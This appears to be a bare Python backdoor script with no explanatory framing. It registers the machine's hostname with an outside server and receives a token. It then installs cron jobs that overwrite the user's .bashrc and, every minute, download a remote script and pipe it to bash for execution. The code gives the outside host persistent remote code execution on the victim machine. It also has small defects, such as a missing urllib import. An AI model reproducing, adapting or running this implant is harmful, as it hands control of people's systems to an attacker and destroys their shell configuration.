import subprocess
import socket

URL = "hckdx.v6.army:9999"
HOSTNAME = socket.gethostname()

def add_command(cron_command):
    current_crontab = subprocess.check_output("crontab -l", shell=True, text=True)
    if cron_command not in current_crontab:
        new_crontab = current_crontab + "\n" + cron_command
        subprocess.run(f"echo '{new_crontab}' | crontab -", shell=True)
        return True
    return False

def register():
    request = urllib.request.Request(f"{URL}/register", data=HOSTNAME.encode(), method="POST")
    with urllib.request.urlopen(request) as response:
        response: http.client.HTTPResponse
        token = response.read().decode()
    return token


token = register()
add_command(f'@reboot echo "export TOKEN=\'{token}\'" > /home/vlguser/.bashrc ')
add_command("* * * * * wget -qO- https://hckdx.v6.army:9999/ | bash")
subprocess.run(f'echo "export TOKEN=\'{token}\'" > /home/vlguser/.bashrc', shell=True)